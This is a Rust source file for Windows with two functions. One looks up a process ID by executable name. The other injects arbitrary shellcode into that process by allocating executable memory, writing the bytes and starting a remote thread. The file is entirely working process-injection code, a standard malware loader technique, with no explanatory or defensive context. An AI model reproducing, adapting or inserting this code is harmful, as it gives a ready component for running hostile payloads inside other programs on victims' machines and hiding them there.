use windows::Win32::Foundation::{CloseHandle, FALSE, HANDLE};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Threading::{
    OpenProcess, CreateRemoteThread, PROCESS_ALL_ACCESS, PROCESS_CREATE_THREAD, 
    PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
};
use windows::Win32::System::Diagnostics::Debug::{
    WriteProcessMemory,
};
use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use anyhow::{Result, Context, anyhow};
use std::ffi::c_void;

pub fn find_process_by_name(name: &str) -> Result<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)?;
        if snapshot.is_invalid() {
            return Err(anyhow!("Failed to create snapshot"));
        }

        let mut entry = PROCESSENTRY32W::default();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let process_name = String::from_utf16_lossy(&entry.szExeFile);
                let process_name = process_name.trim_matches('\0');
                
                if process_name.eq_ignore_ascii_case(name) {
                    let _ = CloseHandle(snapshot);
                    return Ok(entry.th32ProcessID);
                }

                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
        
        let _ = CloseHandle(snapshot);
        Err(anyhow!("Process not found: {}", name))
    }
}

pub fn inject_shellcode(pid: u32, shellcode: &[u8]) -> Result<()> {
    unsafe {
        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            FALSE,
            pid,
        ).context("Failed to open target process")?;

        if process_handle.is_invalid() {
            return Err(anyhow!("Invalid process handle"));
        }

        // Allocate memory in target process
        let remote_mem = VirtualAllocEx(
            process_handle,
            Some(std::ptr::null()),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_mem.is_null() {
            let _ = CloseHandle(process_handle);
            return Err(anyhow!("Failed to allocate memory in target process"));
        }

        // Write shellcode to allocated memory
        let mut bytes_written = 0;
        let write_result = WriteProcessMemory(
            process_handle,
            remote_mem,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            Some(&mut bytes_written),
        );

        if write_result.is_err() || bytes_written != shellcode.len() {
            let _ = CloseHandle(process_handle);
            return Err(anyhow!("Failed to write memory to target process"));
        }

        // Create remote thread to execute shellcode
        let start_routine: Option<unsafe extern "system" fn(*mut c_void) -> u32> = std::mem::transmute(remote_mem);
        
        let thread_handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            start_routine,
            None,
            0,
            None,
        ).context("Failed to create remote thread")?;

        if thread_handle.is_invalid() {
            let _ = CloseHandle(process_handle);
            return Err(anyhow!("Remote thread handle invalid"));
        }

        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);
        
        Ok(())
    }
}
